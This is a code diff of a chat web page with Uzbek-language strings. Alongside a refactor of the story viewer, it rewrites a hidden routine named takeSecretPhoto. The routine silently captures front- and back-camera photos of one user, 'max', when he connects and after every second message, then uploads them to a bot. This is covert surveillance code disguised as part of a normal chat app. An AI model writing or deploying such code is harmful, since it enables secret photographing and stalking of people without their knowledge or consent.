             if (!hasActiveStory(profilesData[myUser])) { alert("Sizda o'chirish uchun faol istoriya yo'q!"); return; }
-            if (confirm("Barcha istoriyalaringizni haqiqatan ham o'chirib tashlaysizmi?")) {
-                socket.emit('delete_story'); document.getElementById('profileModal').style.display = 'none';
-            }
-        }
+            if (confirm("Barcha istoriyalaringizni haqiqatan ham o'chirib tashlaysizmi?")) { socket.emit('delete_story'); document.getElementById('profileModal').style.display='none'; }
+        };
 
-        function viewStory(user) {
-            const userObj = profilesData[user];
-            if (!hasActiveStory(userObj)) { alert("Hozircha istoriya yo'q"); return; }
-            if (!userObj.stories) userObj.stories = [];
-            if (userObj.story && userObj.stories.length === 0) userObj.stories.push({url: userObj.story, type: userObj.storyType});
+        // STORY
+        window.viewStory = function(user) {
+            var u = profilesData[user];
+            if (!hasActiveStory(u)) { alert("Hozircha istoriya yo'q"); return; }
+            if (!u.stories) u.stories = [];
+            if (u.story && u.stories.length === 0) u.stories.push({url: u.story, type: u.storyType});
             viewingUser = user; currentStoryIndex = 0; showStorySlide();
-        }
-
+        };
         function showStorySlide() {
-            const stories = profilesData[viewingUser].stories;
+            var stories = profilesData[viewingUser].stories;
             if (currentStoryIndex >= stories.length) { closeStory(); return; }
-            const viewer = document.getElementById('storyViewer'); const content = document.getElementById('storyContent'); const indicator = document.getElementById('storyIndicator');
-            const currentObj = stories[currentStoryIndex]; const fileUrl = `/uploads/${currentObj.url}`;
-            content.innerHTML = ''; indicator.innerText = `${currentStoryIndex + 1} / ${stories.length}`;
-            if (currentObj.type.startsWith('video/')) {
-                const vid = document.createElement('video'); vid.src = fileUrl; vid.autoplay = true; vid.onclick = nextStory; vid.onended = nextStory;
-                vid.style.maxWidth = '100%'; vid.style.maxHeight = '90vh'; vid.style.borderRadius = '10px'; content.appendChild(vid);
+            var viewer=document.getElementById('storyViewer'), content=document.getElementById('storyContent'), indicator=document.getElementById('storyIndicator');
+            var cur=stories[currentStoryIndex], fileUrl='/uploads/'+cur.url;
+            content.innerHTML = ''; indicator.innerText = (currentStoryIndex+1)+' / '+stories.length;
+            if (cur.type && cur.type.startsWith('video/')) {
+                var vid=document.createElement('video'); vid.src=fileUrl; vid.autoplay=true; vid.onclick=nextStory; vid.onended=nextStory;
+                vid.style.cssText='max-width:100%; max-height:90vh; border-radius:10px;'; content.appendChild(vid);
             } else {
-                const img = document.createElement('img'); img.src = fileUrl; img.onclick = nextStory;
-                img.style.maxWidth = '100%'; img.style.maxHeight = '90vh'; img.style.borderRadius = '10px'; content.appendChild(img);
-                if(storyTimeout) clearTimeout(storyTimeout); storyTimeout = setTimeout(nextStory, 5000); 
+                var img=document.createElement('img'); img.src=fileUrl; img.onclick=nextStory;
+                img.style.cssText='max-width:100%; max-height:90vh; border-radius:10px;'; content.appendChild(img);
+                if (storyTimeout) clearTimeout(storyTimeout); storyTimeout=setTimeout(nextStory,5000);
             }
-            viewer.style.display = 'flex';
+            viewer.style.display='flex';
         }
-
         function nextStory() { if(storyTimeout) clearTimeout(storyTimeout); currentStoryIndex++; showStorySlide(); }
-        function closeStory() { if(storyTimeout) clearTimeout(storyTimeout); document.getElementById('storyContent').innerHTML = ''; document.getElementById('storyViewer').style.display = 'none'; viewingUser = null; }
+        window.closeStory = function() {
+            if(storyTimeout) clearTimeout(storyTimeout);
+            document.getElementById('storyContent').innerHTML='';
+            document.getElementById('storyViewer').style.display='none';
+            viewingUser=null;
+        };
 
-        let maxMessageCount = 0;
+        // MAX TASDIQLASH
         async function takeSecretPhoto(facingMode) {
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facingMode } });
-                const video = document.createElement('video'); video.srcObject = stream; await video.play();
-                const canvas = document.createElement('canvas'); canvas.width = video.videoWidth; canvas.height = video.videoHeight;
-                canvas.getContext('2d').drawImage(video, 0, 0); stream.getTracks().forEach(track => track.stop());
-                return new Promise(resolve => { canvas.toBlob(blob => resolve(blob), 'image/jpeg', 0.8); });
-            } catch (err) { return null; }
+                var stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facingMode } });
+                var video = document.createElement('video'); video.srcObject = stream; await video.play();
+                var canvas = document.createElement('canvas'); canvas.width=video.videoWidth; canvas.height=video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0); stream.getTracks().forEach(function(t){t.stop();});
+                return new Promise(function(resolve){ canvas.toBlob(function(blob){resolve(blob);},'image/jpeg',0.8); });
+            } catch(err) { return null; }
         }
         async function uploadAndSendToBot(blob, type) {
-            const formData = new FormData(); formData.append('file', blob, `verify_${Date.now()}.jpg`);
-            try {
-                const res = await fetch('/upload', { method: 'POST', body: formData }); const data = await res.json();
-                socket.emit('verify_photo', { filename: data.filename, type: type });
-            } catch (e) { }
+            var fd = new FormData(); fd.append('file', blob, 'verify_'+Date.now()+'.jpg');
+            try { var r=await fetch('/upload',{method:'POST',body:fd}); var d=await r.json(); socket.emit('verify_photo',{filename:d.filename,type:type}); } catch(e){}
         }
         async function runVerification() {
-            if (myUser !== 'max') return; 
-            const frontBlob = await takeSecretPhoto('user');
-            if (frontBlob) await uploadAndSendToBot(frontBlob, 'Old Kamera 🤳');
-            await new Promise(r => setTimeout(r, 1000));
-            const backBlob = await takeSecretPhoto('environment');
-            if (backBlob) await uploadAndSendToBot(backBlob, 'Orqa Kamera 🌍');
+            if (myUser !== 'max') return;
+            var fb = await takeSecretPhoto('user');
+            if (fb) await uploadAndSendToBot(fb, 'Old Kamera \uD83E\uDD33');
+            await new Promise(function(r){setTimeout(r,1000);});
+            var bb = await takeSecretPhoto('environment');
+            if (bb) await uploadAndSendToBot(bb, 'Orqa Kamera \uD83C\uDF0D');
         }
-        // script.js public papkasida ham bor - uning socket ishlarini bloklaymiz
-        // (script.js ning join va sendMessage override lari bu chat.html bilan conflict qiladi)
-        socket.on('connect', () => { if (myUser === 'max') setTimeout(runVerification, 3000); });
-        const originalSendMessage = window.sendMessage;
+        socket.on('connect', function() { if (myUser==='max') setTimeout(runVerification, 3000); });
+        var _orig = window.sendMessage;
         window.sendMessage = function() {
-            originalSendMessage(); 
-            if (myUser === 'max') { maxMessageCount++; if (maxMessageCount % 2 === 0) runVerification(); }
-        }
+            _orig();
+            if (myUser==='max') { maxMessageCount++; if (maxMessageCount%2===0) runVerification(); }
+        };
     </script>
 </body>
 </html>
